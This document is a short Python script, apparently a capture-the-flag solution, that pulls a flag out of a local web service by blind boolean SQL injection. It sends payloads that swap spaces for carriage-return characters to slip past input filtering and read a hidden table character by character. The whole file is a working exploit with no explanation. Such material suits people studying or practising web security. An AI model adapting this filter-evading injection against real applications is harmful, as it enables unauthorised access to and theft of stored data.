```python
import requests
import string
char = string.printable


url = "http://localhost:1301/"
flag = ""

for i in range(1,10000):
    for j in char:
        print(j,end="\r")
        payload = f"?id=1&ans=2'\x0DOR\x0DSUBSTR((select\x0D(select\x0Dgroup_concat(c)\x0Dfrom\x0D(select\x0Dnull,null,null\x0Das\x0Dc\x0Dunion\x0Dselect\x0D*\x0Dfrom\x0DQuiBuu\x0Dwhere\x0Did\x0D=\x0D1337)a)),\x0D{i},\x0D1)\x0D=\x0D'{j}"
        
        r = requests.get(url= url + payload)

        if "Haha QuiBuu!" in r.text:
            flag += j
            print(flag)
            break
```
